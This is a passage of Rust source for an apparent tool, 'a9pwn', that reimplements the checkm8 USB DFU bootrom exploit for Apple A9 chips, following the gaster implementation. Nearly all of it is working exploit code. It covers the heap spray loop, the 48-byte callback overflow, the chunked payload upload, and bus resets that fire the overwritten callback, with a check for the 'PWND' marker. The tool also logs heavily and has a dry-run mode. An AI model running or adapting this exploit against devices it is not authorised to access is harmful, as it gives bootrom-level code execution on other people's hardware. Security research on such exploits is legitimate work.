/// wValue=0, wIndex=0x80`, and a STALL is the answer we want.
fn usb_request_stall(io: &mut StageIo) -> XferResult {
    let r = req_no_data(io, 2, 3, 0, 0x80, 0);
    io.trace.xfer(Stage::Spray, "spray_request_stall", &r);
    r
}

/// `wValue` for the leak requests: `(3 << 8) | iSerialNumber` (gaster.c:866).
fn leak_wvalue(io: &StageIo) -> u16 {
    (3u16 << 8) | io.usb.identity().i_serial as u16
}

/// gaster's `checkm8_usb_request_leak` (gaster.c:862-867).
fn usb_request_leak(io: &mut StageIo) -> XferResult {
    let wvalue = leak_wvalue(io);
    let index = io.opts.leak_windex;
    let r = req_async(io, 0x80, 6, wvalue, index, EP0_MAX_PACKET_SZ, 1);
    io.trace.xfer(Stage::Spray, "spray_request_leak", &r);
    r
}

/// gaster's `checkm8_no_leak` (gaster.c:882-887).
fn no_leak(io: &mut StageIo) -> XferResult {
    let wvalue = leak_wvalue(io);
    let index = io.opts.leak_windex;
    let r = req_async(
        io,
        0x80,
        6,
        wvalue,
        index,
        3 * EP0_MAX_PACKET_SZ + 1,
        1,
    );
    io.trace.xfer(Stage::Spray, "spray_no_leak", &r);
    r
}

/// gaster's `checkm8_stage_spray` (gaster.c:896-918), **A9 branch**.
///
/// The A9 path is selected by `config_large_leak == 0` and `cpid == 0x8003 ||
/// 0x8000` (gaster.c:900-901) and is a single flat loop of
/// `stall && leak && no-leak` with the reference's short-circuit order: if the
/// stall request does not STALL, the leak requests are not issued that iteration.
/// Anything else is refused rather than approximated — a different heap layout
/// driven with the A9 sequence is a silent corruption of the wrong object.
pub fn stage_spray(io: &mut StageIo) -> StageResult {
    if io.cfg.large_leak != 0 {
        return fail(
            "SPRAY_UNSUPPORTED_LARGE_LEAK",
            format!(
                "config {} has large_leak={} (non-zero). gaster's large-leak branch \
                 (gaster.c:911-915) is a different heap layout and is not driven here.",
                io.cfg.name, io.cfg.large_leak
            ),
            None,
        );
    }
    if io.cfg.cpid != 0x8003 && io.cfg.cpid != 0x8000 {
        return fail(
            "SPRAY_UNSUPPORTED_CHIP",
            format!(
                "config {} is CPID 0x{:04X}; only the A9 spray branch (gaster.c:902) is \
                 implemented. gaster.c:904-908 is a different sequence.",
                io.cfg.name, io.cfg.cpid
            ),
            None,
        );
    }

    let mut iterations: u64 = 0;
    let mut stalls = 0u64;
    let mut leaks = 0u64;
    let mut no_leaks = 0u64;
    let mut last: Option<XferResult> = None;
    let started = Instant::now();

    loop {
        iterations += 1;
        // The reference is genuinely unbounded here (gaster.c:902) and that is
        // not tidied away — it is bounded by the run-level budget, which is the
        // only bounded-spin budget `RunOptions` freezes (INTERFACE.md §4), and
        // every iteration is logged.
        let elapsed_ms = started.elapsed().as_millis() as u64;
        if iterations > io.opts.setup_budget.max_attempts
            || (io.opts.setup_budget.max_millis > 0
                && elapsed_ms >= io.opts.setup_budget.max_millis)
        {
            let detail = format!(
                "SPRAY did not satisfy stall && leak && no-leak in {} iterations / {} ms \
                 (run-level budget {} attempts / {} ms; gaster loops forever here, \
                 gaster.c:902). stalls={stalls} leaks={leaks} no_leaks={no_leaks} \
                 leak_windex=0x{:X}",
                iterations - 1,
                elapsed_ms,
                io.opts.setup_budget.max_attempts,
                io.opts.setup_budget.max_millis,
                io.opts.leak_windex
            );
            io.trace.event("spray_summary", Some(Stage::Spray), &detail);
            println!("  SPRAY: {}", one_line(&detail));
            return fail("SPRAY_BUDGET_EXHAUSTED", detail, last);
        }

        let s = usb_request_stall(io);
        io.trace.predicate(
            Stage::Spray,
            "checkm8_usb_request_stall",
            s.status == XferStatus::Stall,
            &format!("iteration={iterations} status={}", s.status),
        );
        let mut line = format!(
            "iteration={iterations} stall_status={} stall_micros={}",
            s.status, s.micros
        );
        let mut progressed = s.status == XferStatus::Stall;
        if progressed {
            stalls += 1;
            let l = usb_request_leak(io);
            line.push_str(&format!(
                " leak_status={} leak_xfer={} leak_micros={}",
                l.status, l.transferred, l.micros
            ));
            progressed = abort_completed(&l) && l.transferred == 0;
            last = Some(l);
            if progressed {
                leaks += 1;
                let n = no_leak(io);
                line.push_str(&format!(
                    " no_leak_status={} no_leak_xfer={} no_leak_micros={}",
                    n.status, n.transferred, n.micros
                ));
                progressed = abort_completed(&n) && n.transferred == 0;
                if progressed {
                    no_leaks += 1;
                }
            } else {
                // gaster's `||` short-circuits: no-leak is not issued this pass.
                line.push_str(" no_leak=not_issued(short_circuit)");
            }
        } else {
            line.push_str(" leak=not_issued(short_circuit) no_leak=not_issued(short_circuit)");
            last = Some(s);
        }

        io.trace.event("spray_iteration", Some(Stage::Spray), &line);
        if should_print_attempt(io.opts, iterations) {
            println!("  SPRAY: {line}");
        }

        if progressed {
            break;
        }
    }

    // gaster.c:910 — the final clear-status, whose length is the spray's own
    // magic number (3 * EP0_MAX_PACKET_SZ + 1).
    let clr = req_no_data(io, 0x21, DFU_CLRSTATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1);
    io.trace.xfer(Stage::Spray, "spray_clr_status", &clr);
    io.trace.event(
        "spray_summary",
        Some(Stage::Spray),
        &format!(
            "iterations={iterations} stalls={stalls} leaks={leaks} no_leaks={no_leaks} \
             final_clr_status={}",
            clr.status
        ),
    );
    StageResult::Pass
}

// ---------------------------------------------------------------------------
// PATCH
// ---------------------------------------------------------------------------

/// gaster's `checkm8_stage_patch` (gaster.c:1009-1229), A9 branch.
///
/// Order matters and is fixed: the 48-byte callback overflow first (gaster.c:1211)
/// — a **STALL is the success condition**, because the request is rejected
/// *because* it overran — then the payload in `DFU_MAX_TRANSFER_SZ` chunks
/// (gaster.c:1213-1216), then the file suffix and the MANIFEST state walk
/// (gaster.c:1218-1222). The bus reset that actually fires the overwritten
/// `dfu_handle_bus_reset` happens in `run`, after this returns.
///
/// Two deliberate, documented deviations, both observability:
///
/// 1. gaster sends the overflow with `wIndex = 0x80` (gaster.c:1211) while its own
///    `checkm8_usb_request_stall` uses the same 0x80 (gaster.c:893). `a9ctl`
///    hardcoded `wValue = wIndex = 0` for every OUT request, so its overflow went
///    out with `wIndex = 0` — an internally inconsistent mutation of the same
///    request. gaster's 0x80 is implemented here. (King's implementation instead
///    decomposes this as `(0, 0, 0, 0)`; that is a different variant of the
///    exploit, not a fix for gaster's sequence, and is not what we run.)
/// 2. gaster's upload loop cannot fail: `send_usb_control_request` returns `true`
///    unconditionally (gaster.c:239) and its `transfer_ret` is passed as NULL, so
///    a short chunk is silently ignored. Here a chunk that does not return OK with
///    every byte sent fails the stage with `PATCH_UPLOAD_SHORT`. A short chunk
///    means the payload in the bootrom is garbage; reporting that is the point of
///    this rewrite.
pub fn stage_patch(io: &mut StageIo, built: &BuiltPayload) -> StageResult {
    if built.overwrite.len() != OVERWRITE_STRUCT_SIZE {
        return fail(
            "PATCH_OVERWRITE_SIZE_INVALID",
            format!(
                "overwrite buffer is {} bytes, expected {OVERWRITE_STRUCT_SIZE} (one \
                 dfu_callback_t, gaster.c:111-113)",
                built.overwrite.len()
            ),
            None,
        );
    }

    // gaster.c:1211 — bm=2, b=3, wValue=0, wIndex=0x80.
    let overflow = req_out(
        io,
        CtrlReq {
            bm: 2,
            b: 3,
            value: 0,
            index: 0x80,
            length: built.overwrite.len() as u16,
        },
        &built.overwrite,
    );
    io.trace.xfer(Stage::Patch, "patch_overflow_callback", &overflow);
    io.trace.predicate(
        Stage::Patch,
        "patch_overflow_stall",
        overflow.status == XferStatus::Stall,
        &format!(
            "bm=2 b=3 wValue=0 wIndex=0x80 len={} -> {} (gaster.c:1211)",
            built.overwrite.len(),
            overflow.status
        ),
    );
    if overflow.status != XferStatus::Stall {
        return fail(
            "PATCH_OVERWRITE_NOT_STALLED",
            format!(
                "the {}-byte callback overflow returned {} instead of STALL (gaster.c:1211: a \
                 STALL here is the success condition — the request is rejected because it \
                 overran). wIndex was 0x80.",
                built.overwrite.len(),
                overflow.status
            ),
            Some(overflow),
        );
    }

    let chunk_sz = DFU_MAX_TRANSFER_SZ as usize;
    let mut sent = 0usize;
    for (i, chunk) in built.blob.chunks(chunk_sz).enumerate() {
        let r = req_out(
            io,
            CtrlReq {
                bm: 0x21,
                b: DFU_DNLOAD,
                value: 0,
                index: 0,
                length: chunk.len() as u16,
            },
            chunk,
        );
        io.trace.xfer(Stage::Patch, "patch_upload_chunk", &r);
        if !(r.status == XferStatus::Ok && r.transferred == chunk.len()) {
            return fail(
                "PATCH_UPLOAD_SHORT",
                format!(
                    "payload chunk {i} ({} bytes at offset {sent}) returned {} with {} bytes \
                     sent. gaster ignores this (gaster.c:1215 passes no transfer_ret); a short \
                     chunk means the payload in the bootrom is incomplete.",
                    chunk.len(),
                    r.status,
                    r.transferred
                ),
                Some(r),
            );
        }
        sent += chunk.len();
    }

    let suffix = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LEN);
    io.trace.xfer(Stage::Patch, "patch_dnload_suffix", &suffix);
    let end = req_no_data(io, 0x21, DFU_DNLOAD, 0, 0, 0);
    io.trace.xfer(Stage::Patch, "patch_dnload_end", &end);

    // gaster.c:1220-1222 ignores the result of these three; the real proof of a
    // pwn is the PWND marker after the next bus reset, so a failure here is
    // recorded loudly and does not fail the stage.
    let mut state_ok = true;
    for (state, label) in [
        (DFU_STATE_MANIFEST_SYNC, "patch_status_manifest_sync"),
        (DFU_STATE_MANIFEST, "patch_status_manifest"),
        (DFU_STATE_MANIFEST_WAIT_RESET, "patch_status_manifest_wait_reset"),
    ] {
        let (ok, _) = dfu_check_status(io, Stage::Patch, DFU_STATUS_OK, state, label);
        state_ok &= ok;
    }

    io.trace.event(
        "patch_uploaded",
        Some(Stage::Patch),
        &format!(
            "overflow={} bytes STALLed, uploaded={} bytes, sha256={}, manifest_walk_ok={} \
             (gaster.c:1218-1222 does not check it; the PWND marker after the next reset is \
             the real proof)",
            built.overwrite.len(),
            sent,
            built.blob_sha256,
            state_ok
        ),
    );
    if !state_ok {
        println!(
            "  PATCH: warning - the MANIFEST state walk after the upload did not complete \
             cleanly; gaster does not check it (gaster.c:1220-1222). Waiting for the PWND \
             marker after the reset."
        );
    }
    StageResult::Pass
}

// ---------------------------------------------------------------------------
// run / run_one_stage
// ---------------------------------------------------------------------------

fn dispatch(io: &mut StageIo, stage: Stage, built: &BuiltPayload) -> StageResult {
    match stage {
        Stage::Reset => stage_reset(io),
        Stage::Setup => stage_setup(io),
        Stage::Spray => stage_spray(io),
        Stage::Patch => stage_patch(io, built),
        Stage::Pwned => StageResult::Pass,
    }
}

/// Run the exploit. `INTERFACE.md` §4.
///
/// `RESET → SETUP → SPRAY → PATCH → bus reset → re-open → check PWND`, capped at
/// `max_rounds`, with a bus reset after **every** attempt (gaster.c:1268) and a
/// re-open that re-reads the serial descriptor before the next attempt — which
/// is how a successful pwn is detected at all (the payload writes
/// ` PWND:[checkm8]` into `gUSBSerialNumber`, gaster.c:811).
///
/// `--dry-run` builds every byte, prints the field traces and **never opens the
/// device** (INTERFACE.md §0.1 allows a non-Lead to run this path and only this
/// path). Planning against an attached device is what `a9pwn plan` does.
pub fn run(opts: RunOptions) -> RunOutcome {
    if let Err(e) = payload::verify_blob_hashes() {
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }

    let filter = opts.stage_filter;
    if let Some(stage) = filter {
        return run_one_stage(stage, opts);
    }
    if opts.dry_run {
        return dry_run_all(&opts);
    }

    let mut tracer = match Tracer::new(opts.trace_path.clone(), opts.verbose) {
        Ok(t) => t,
        Err(e) => return RunOutcome::Aborted(format!("cannot open trace file: {e}")),
    };
    tracer.event(
        "run_start",
        None,
        &format!(
            "rounds={} usb_timeout={}ms abort_min={}ms leak_windex=0x{:X} \
             setup_budget={}attempts/{}ms settle_ms={} stop_after_setup_stall={} allow_winusb={}",
            opts.max_rounds,
            opts.usb_timeout_ms,
            opts.abort_timeout_min_ms,
            opts.leak_windex,
            opts.setup_budget.max_attempts,
            opts.setup_budget.max_millis,
            opts.settle_ms,
            opts.stop_after_setup_stall,
            opts.allow_winusb
        ),
    );

    let outcome = run_rounds(&opts, &mut tracer);
    tracer.event("run_end", None, &format!("{outcome:?}"));
    tracer.flush();
    print_stage_summary(&tracer, "stages");
    outcome
}

fn run_rounds(opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
    let mut session: Option<Session> = None;
    let mut stage = Stage::Reset;
    let mut rounds: u32 = 0;

    loop {
        if rounds >= opts.max_rounds {
            tracer.event("rounds_exhausted", None, &format!("{rounds} rounds"));
            return RunOutcome::Exhausted { rounds };
        }

        // gaster.c:1243 — wait_usb_handle() re-opens (and re-configures) the
        // device at the top of every iteration, and reads the serial descriptor.
        let mut usb = match open_with_retry(opts, tracer) {
            Ok(t) => t,
            Err(e) => {
                tracer.event("no_device", None, &e);
                return if rounds == 0 {
                    RunOutcome::NoDevice
                } else {
                    RunOutcome::Aborted(format!(
                        "the device disappeared after {rounds} round(s): {e}"
                    ))
                };
            }
        };

        let id = usb.identity();
        if id.is_pwned() {
            tracer.event(
                "pwned",
                Some(Stage::Pwned),
                &format!("PWND marker present: {:?}", id.pwnd),
            );
            println!("  PWND marker present: {:?} — checkm8 landed.", id.pwnd);
            return RunOutcome::Pwned;
        }

        if session.is_none() {
            let (cfg, kind) = match config_for_identity(&id) {
                Ok(v) => v,
                Err(e) => {
                    tracer.event("unsupported", None, &e);
                    return RunOutcome::Unsupported(e);
                }
            };
            let driver = usb.driver_class();
            let cap = usb.reset_capability();
            tracer.event(
                "device",
                None,
                &format!(
                    "serial={:?} cpid=0x{:04X} cprv={:?} bdid={:?} srtg={:?} driver={} reset={} \
                     config={}",
                    id.serial,
                    cfg.cpid,
                    id.cprv,
                    id.bdid,
                    id.srtg,
                    driver.as_str(),
                    cap.as_str(),
                    cfg.name
                ),
            );
            if let Some(note) = cfg.cprv_note(&id) {
                tracer.event("cprv_mismatch", None, &note);
                println!("  note: {note}");
            }

            // The reset is not a formality: after PATCH it is what fires the
            // overwritten dfu_handle_bus_reset callback (gaster.c:1268). Refuse
            // rather than run an experiment that cannot succeed.
            if driver == DriverClass::WinUsb && !opts.allow_winusb {
                return RunOutcome::Aborted(format!(
                    "the bound driver is {}, which cannot perform a host-initiated reset \
                     (libusb's windows_winusb.c:3419 returns success after cycling pipes only). \
                     checkm8 needs a real bus reset after every stage attempt. Bind libusbK or \
                     libusb0, or pass --allow-winusb to reproduce the failure mode deliberately.",
                    driver.as_str()
                ));
            }
            if cap != ResetCapability::Real && !opts.allow_winusb {
                return RunOutcome::Aborted(format!(
                    "reset capability is \"{}\": the bus reset after every stage attempt would \
                     be a no-op, and checkm8 cannot fire without it (gaster.c:1268). Refusing; \
                     --allow-winusb overrides only to prove the failure.",
                    cap.as_str()
                ));
            }

            let built = match payload::build_payload(&cfg, kind) {
                Ok(b) => b,
                Err(e) => return RunOutcome::Aborted(format!("payload build failed: {e}")),
            };
            tracer.event(
                "payload_built",
                None,
                &format!(
                    "kind={} {} bytes (overwrite {}), sha256 {}",
                    kind.name(),
                    built.blob.len(),
                    built.overwrite.len(),
                    built.blob_sha256
                ),
            );
            session = Some(Session { cfg, built });
        }
        let s = session.as_ref().expect("session set above");

        rounds += 1;
        // Typed helper, not a bare event string: `Tracer` counts rounds by exact
        // kind (`trace::kind::ROUND`), and the verdict reads that count.
        tracer.round(
            rounds,
            &format!(
                "of {} stage={} (gaster.c:1243-1276)",
                opts.max_rounds,
                stage.name()
            ),
        );

        let executed = stage;
        let result = {
            let mut io = StageIo {
                usb: &mut usb,
                trace: &mut *tracer,
                cfg: &s.cfg,
                opts,
            };
            dispatch(&mut io, executed, &s.built)
        };
        let passed = result.is_pass();
        match &result {
            StageResult::Pass => tracer.event("stage_pass", Some(executed), executed.name()),
            StageResult::Fail(f) => {
                tracer.event(
                    "stage_fail",
                    Some(executed),
                    &format!(
                        "code={} detail={} last={}",
                        f.code,
                        f.detail,
                        f.last
                            .as_ref()
                            .map(|r| r.one_line())
                            .unwrap_or_else(|| "-".to_string())
                    ),
                );
                println!(
                    "  {} FAILED [{}] {}",
                    executed.name(),
                    f.code,
                    one_line(&f.detail)
                );
            }
        }

        // gaster.c:1245-1267: a pass advances the machine, any failure sends it
        // back to RESET — and PATCH always returns to RESET, pass or fail, so the
        // next round re-opens the device and looks for the PWND marker.
        let next = match (executed, passed) {
            (Stage::Reset, true) => Stage::Setup,
            (Stage::Setup, true) => Stage::Spray,
            (Stage::Spray, true) => Stage::Patch,
            (Stage::Patch, _) => Stage::Reset,
            (_, false) => Stage::Reset,
            (Stage::Pwned, _) => Stage::Pwned,
        };
        let stop_here = passed && executed == Stage::Setup && opts.stop_after_setup_stall;
        stage = next;

        // gaster.c:1268 — after EVERY attempt, pass or fail.
        //
        // The reset is not trusted, it is verified. gaster discards the result
        // (gaster.c:198-199) and libusb returns LIBUSB_SUCCESS unconditionally on
        // Windows (`windows_winusb.c:3419`), silently skipping the reset
        // altogether unless interface 0 was claimed (`:3414-3416`). The
        // transport's `bus_reset_delivered` is the judgement over all three
        // measured facts, and it is what decides here.
        match usb.reset() {
            Ok(report) => {
                // `Tracer::reset` is the typed helper the `resets_real` /
                // `resets_pipe_cycle` counters are driven by.
                tracer.predicate(
                    Stage::Reset,
                    "bus_reset_delivered",
                    report.bus_reset_delivered,
                    &format!(
                        "after {}: rc={} capability=\"{}\" interface_claimed={} micros={} {}",
                        executed.name(),
                        report.libusb_rc,
                        report.capability.as_str(),
                        report.interface_claimed,
                        report.micros,
                        report.note
                    ),
                );
                tracer.reset(
                    report.bus_reset_delivered,
                    &format!(
                        "after {} (round {rounds}): rc={} capability=\"{}\" interface_claimed={} \
                         micros={} {}",
                        executed.name(),
                        report.libusb_rc,
                        report.capability.as_str(),
                        report.interface_claimed,
                        report.micros,
                        report.note
                    ),
                );
                if !report.bus_reset_delivered && !opts.allow_winusb {
                    return RunOutcome::Aborted(format!(
                        "the bus reset after {} was not delivered (\"{}\", rc={}, \
                         interface_claimed={}): {}. The reset is what both cleans the DFU state \
                         and, after PATCH, fires the overwritten dfu_handle_bus_reset callback, \
                         so continuing would be a different experiment. --allow-winusb overrides \
                         only to prove the failure.",
                        executed.name(),
                        report.capability.as_str(),
                        report.libusb_rc,
                        report.interface_claimed,
                        report.note
                    ));
                }
            }
            Err(e) => {
                // Not counted as real and not as a pipe cycle: the call itself
                // failed, which is a third outcome (`trace::kind::RESET` counts
                // the attempt only).
                tracer.event(
                    kind::RESET,
                    Some(Stage::Reset),
                    &format!("after {} (round {rounds}): the reset call failed: {e}", executed.name()),
                );
                if !opts.allow_winusb {
                    return RunOutcome::Aborted(format!(
                        "the bus reset after round {rounds} failed: {e}. checkm8 needs a real \
                         reset after every attempt (gaster.c:1268)."
                    ));
                }
            }
        }

        // gaster.c:1273 — close, then re-open at the top of the loop.
        drop(usb);

        if stop_here {
            tracer.event(
                "stop_after_setup_stall",
                Some(Stage::Setup),
                &format!("SETUP passed on round {rounds}; stopping before SPRAY/PATCH"),
            );
            return RunOutcome::Aborted(format!(
                "diagnostic stop (--stop-after-setup-stall): SETUP reached its pad STALL on \
                 round {rounds}. SPRAY and PATCH were not attempted and no payload was \
                 uploaded. The device was left reset, not pwned."
            ));
        }

        if opts.settle_ms > 0 {
            sleep(Duration::from_millis(opts.settle_ms as u64));
        }
    }
}

/// Run exactly one stage. `INTERFACE.md` §4.
///
/// gaster only ever reaches SETUP from a RESET that returned true *and* a
/// completed bus reset (gaster.c:1245-1252, 1268), and SPRAY/PATCH in turn only
/// from SETUP/SPRAY. A single-stage run with no preceding RESET is exactly the
/// experiment that produced the previous session's flat-timeout artefact, so
/// every stage other than RESET performs its RESET precondition first and
/// refuses to run if that precondition fails.
pub fn run_one_stage(stage: Stage, opts: RunOptions) -> RunOutcome {
    if stage == Stage::Pwned {
        return RunOutcome::Aborted(
            "PWNED is a state the device is in, not a stage that can be run".to_string(),
        );
    }
    if let Err(e) = payload::verify_blob_hashes() {
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }
    if opts.dry_run {
        return dry_run_stage(stage, &opts);
    }

    let mut tracer = match Tracer::new(opts.trace_path.clone(), opts.verbose) {
        Ok(t) => t,
        Err(e) => return RunOutcome::Aborted(format!("cannot open trace file: {e}")),
    };
    tracer.event(
        "single_stage_start",
        Some(stage),
        &format!(
            "precondition={} usb_timeout={}ms leak_windex=0x{:X}",
            if stage == Stage::Reset { "none" } else { "RESET + bus reset" },
            opts.usb_timeout_ms,
            opts.leak_windex
        ),
    );

    let outcome = one_stage_core(stage, &opts, &mut tracer);
    tracer.event("run_end", Some(stage), &format!("{outcome:?}"));
    tracer.flush();
    print_stage_summary(&tracer, stage.name());
    outcome
}

fn one_stage_core(stage: Stage, opts: &RunOptions, tracer: &mut Tracer) -> RunOutcome {
    let mut usb = match open_with_retry(opts, tracer) {
        Ok(t) => t,
        Err(e) => {
            tracer.event("no_device", None, &e);
            return RunOutcome::NoDevice;
        }
    };
    let id = usb.identity();
    if id.is_pwned() {
        tracer.event("pwned", Some(Stage::Pwned), "PWND marker already present");
        return RunOutcome::Pwned;
    }
    let (cfg, kind) = match config_for_identity(&id) {
        Ok(v) => v,
        Err(e) => {
            tracer.event("unsupported", None, &e);
            return RunOutcome::Unsupported(e);
        }
    };
    let driver = usb.driver_class();
    let cap = usb.reset_capability();
    if driver == DriverClass::WinUsb && !opts.allow_winusb {
        return RunOutcome::Aborted(format!(
            "the bound driver is {}, which cannot perform a host-initiated reset; a single-stage \
             run would be an experiment that cannot succeed. --allow-winusb overrides.",
            driver.as_str()
        ));
    }
    if cap != ResetCapability::Real && !opts.allow_winusb {
        return RunOutcome::Aborted(format!(
            "reset capability is \"{}\"; every stage attempt needs a real bus reset after it \
             (gaster.c:1268). --allow-winusb overrides.",
            cap.as_str()
        ));
    }
    let built = match payload::build_payload(&cfg, kind) {
        Ok(b) => b,
        Err(e) => return RunOutcome::Aborted(format!("payload build failed: {e}")),
    };

    // gaster's ordering: RESET, then a bus reset, then the next stage.
    if stage != Stage::Reset {
        println!("  precondition: running RESET first (gaster.c:1245-1252)");
        let reset = {
            let mut io = StageIo {
                usb: &mut usb,
                trace: &mut *tracer,
                cfg: &cfg,
                opts,
            };
            stage_reset(&mut io)
        };
        match &reset {
            StageResult::Fail(f) => {
                tracer.event(
                    "precondition_failed",
                    Some(Stage::Reset),
                    &format!("code={} detail={}", f.code, f.detail),
                );
                return RunOutcome::Aborted(format!(
                    "the RESET precondition for stage {} failed [{}]: {}. gaster only reaches {} \
                     after RESET returned true and a bus reset completed (gaster.c:1245-1268); \
                     running it now would produce an artefact, not a measurement.",
                    stage.name(),
                    f.code,
                    f.detail,
                    stage.name()
                ));
            }
            StageResult::Pass => tracer.event(
                "precondition_passed",
                Some(Stage::Reset),
                "RESET reached MANIFEST_WAIT_RESET",
            ),
        }
        if let Err(e) = reset_device(&mut usb, tracer, opts, "precondition") {
            return e;
        }
        drop(usb);
        usb = match open_with_retry(opts, tracer) {
            Ok(t) => t,
            Err(e) => {
                tracer.event("no_device", None, &e);
                return RunOutcome::NoDevice;
            }
        };
    }

    tracer.event(
        "stage_start",
        Some(stage),
        &format!("cpid=0x{:04X} config={}", cfg.cpid, cfg.name),
    );
    let result = {
        let mut io = StageIo {
            usb: &mut usb,
            trace: &mut *tracer,
            cfg: &cfg,
            opts,
        };
        dispatch(&mut io, stage, &built)
    };
    let code = result.fail_code().map(|c| c.to_string());
    match &result {
        StageResult::Pass => tracer.event("stage_pass", Some(stage), stage.name()),
        StageResult::Fail(f) => tracer.event(
            "stage_fail",
            Some(stage),
            &format!("code={} detail={}", f.code, f.detail),
        ),
    }

    if let Err(e) = reset_device(&mut usb, tracer, opts, "post-stage") {
        return e;
    }
    drop(usb);

    // Re-open and look for the marker: for PATCH this is the only proof there is.
    let tail = match open_with_retry(opts, tracer) {
        Ok(t) => t,
        Err(e) => {
            tracer.event("no_device", None, &e);
            return RunOutcome::Aborted(format!(
                "stage {} finished ({code:?}) but the device could not be re-opened to read the \
                 PWND marker: {e}",
                stage.name()
            ));
        }
    };
    let final_id = tail.identity();
    if final_id.is_pwned() {
        tracer.event("pwned", Some(Stage::Pwned), &format!("{:?}", final_id.pwnd));
        println!("  PWND marker present: {:?} — checkm8 landed.", final_id.pwnd);
        return RunOutcome::Pwned;
    }

    let msg = match code {
        None => format!(
            "stage {} PASSED but the PWND marker is absent. For SETUP and SPRAY that is \
             expected — only PATCH uploads the payload; for PATCH it means the overflow did not \
             land, or the reset after it did not fire the callback.",
            stage.name()
        ),
        Some(c) => format!(
            "stage {} FAILED [{c}] and the PWND marker is absent.",
            stage.name()
        ),
    };
    tracer.event("single_stage_end", Some(stage), &msg);
    RunOutcome::Aborted(msg)
}

/// The bus reset after an attempt (gaster.c:1268), with the report read rather
/// than trusted (`windows_winusb.c:3419` returns success for a pipe cycle).
fn reset_device(
    usb: &mut Transport,
    tracer: &mut Tracer,
    opts: &RunOptions,
    when: &str,
) -> Result<(), RunOutcome> {
    match usb.reset() {
        Ok(report) => {
            tracer.predicate(
                Stage::Reset,
                "bus_reset_delivered",
                report.bus_reset_delivered,
                &format!(
                    "when={when} rc={} capability=\"{}\" interface_claimed={} micros={} {}",
                    report.libusb_rc,
                    report.capability.as_str(),
                    report.interface_claimed,
                    report.micros,
                    report.note
                ),
            );
            tracer.reset(
                report.bus_reset_delivered,
                &format!(
                    "when={when} rc={} capability=\"{}\" interface_claimed={} micros={} {}",
                    report.libusb_rc,
                    report.capability.as_str(),
                    report.interface_claimed,
                    report.micros,
                    report.note
                ),
            );
            if !report.bus_reset_delivered && !opts.allow_winusb {
                return Err(RunOutcome::Aborted(format!(
                    "the {when} bus reset was not delivered (\"{}\", rc={}, \
                     interface_claimed={}): {}",
                    report.capability.as_str(),
                    report.libusb_rc,
                    report.interface_claimed,
                    report.note
                )));
            }
            Ok(())
        }
        Err(e) => {
            tracer.event(
                kind::RESET,
                Some(Stage::Reset),
                &format!("when={when}: the reset call failed: {e}"),
            );
            if !opts.allow_winusb {
                return Err(RunOutcome::Aborted(format!(
                    "the {when} bus reset failed: {e}"
                )));
            }
            Ok(())
        }
    }
}

struct Session {
    cfg: SocConfig,
    built: BuiltPayload,
}

/// gaster's `wait_usb_handle` (gaster.c:202-218) loops forever, sleeping
/// `usb_timeout` ms between attempts. A bus reset re-enumerates the device, so a
/// single failed open right after one is expected — but an unbounded wait is how
/// a run stops being diagnosable. Bounded, then reported.
const OPEN_RETRY_TRIES: u32 = 600;

fn open_with_retry(opts: &RunOptions, tracer: &mut Tracer) -> Result<Transport, String> {
    let pause = Duration::from_millis(opts.timeout_ms() as u64);
    let mut last = String::from("no attempt made");
    for attempt in 1..=OPEN_RETRY_TRIES {
        match Transport::open_first_dfu() {
            Ok(t) => {
                if attempt > 1 {
                    tracer.event(
                        "open_retry_ok",
                        None,
                        &format!("device opened on attempt {attempt} (gaster waits forever here)"),
                    );
                }
                return Ok(t);
            }
            Err(e) => {
                last = e;
                if attempt < OPEN_RETRY_TRIES {
                    sleep(pause);
                }
            }
        }
    }
    Err(format!(
        "no DFU device after {OPEN_RETRY_TRIES} open attempts (~{} ms): {last}",
        OPEN_RETRY_TRIES as u64 * opts.timeout_ms() as u64
    ))
}

fn print_stage_summary(tracer: &Tracer, label: &str) {
    let c = tracer.counters();
    let transfers = c.ok + c.stall + c.timeout + c.cancelled + c.nodevice + c.err;
    if transfers == 0 && c.setup_attempts == 0 && c.resets_attempted == 0 {
        return;
    }
    println!();
    println!("  tracer summary ({label}):");
    for line in tracer.summary_lines() {
        println!("    {line}");
    }
}

// ---------------------------------------------------------------------------
// Dry run: build everything, send nothing, open nothing
// ---------------------------------------------------------------------------

fn dry_run_all(opts: &RunOptions) -> RunOutcome {
    println!("a9pwn DRY RUN - building bytes only. No USB device is opened, nothing is sent.");
    if let Err(e) = payload::verify_blob_hashes() {
        println!("  BLOB VERIFICATION FAILED: {e}");
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }
    println!("  blob sha256  : both vendored blobs verified");
    let mut built_ok = 0usize;
    for cfg in all_configs() {
        match payload::build_payload(cfg, PayloadKind::A9) {
            Ok(built) => {
                print_plan(cfg, PayloadKind::A9, &built);
                built_ok += 1;
            }
            Err(e) => println!("  config {} (0x{:04X}): BUILD FAILED: {e}", cfg.name, cfg.cpid),
        }
    }
    println!();
    println!(
        "  dry run: {built_ok} payload(s) built, 0 transfers issued, no device opened. \
         (usb_timeout={}ms leak_windex=0x{:X} rounds={})",
        opts.usb_timeout_ms, opts.leak_windex, opts.max_rounds
    );
    RunOutcome::Aborted(format!(
        "dry_run: built {built_ok} payload(s); nothing was sent and no device was opened"
    ))
}

fn dry_run_stage(stage: Stage, opts: &RunOptions) -> RunOutcome {
    println!(
        "a9pwn DRY RUN - stage {} only. No USB device is opened, nothing is sent.",
        stage.name()
    );
    if let Err(e) = payload::verify_blob_hashes() {
        println!("  BLOB VERIFICATION FAILED: {e}");
        return RunOutcome::Aborted(format!("payload blob verification failed: {e}"));
    }
    println!("  blob sha256  : both vendored blobs verified");

    match stage {
        Stage::Reset => {
            println!();
            println!("  RESET plan (gaster.c:836-845):");
            println!("    1. DNLOAD {DFU_FILE_SUFFIX_LEN} zero bytes  -> expect OK/{DFU_FILE_SUFFIX_LEN}");
            println!("    2. DNLOAD 0 bytes                  -> expect OK/0");
            println!("    3. GET_STATUS                      -> expect OK, state {DFU_STATE_MANIFEST_SYNC}");
            println!("    4. GET_STATUS                      -> expect OK, state {DFU_STATE_MANIFEST}");
            println!("    5. GET_STATUS                      -> expect OK, state {DFU_STATE_MANIFEST_WAIT_RESET}");
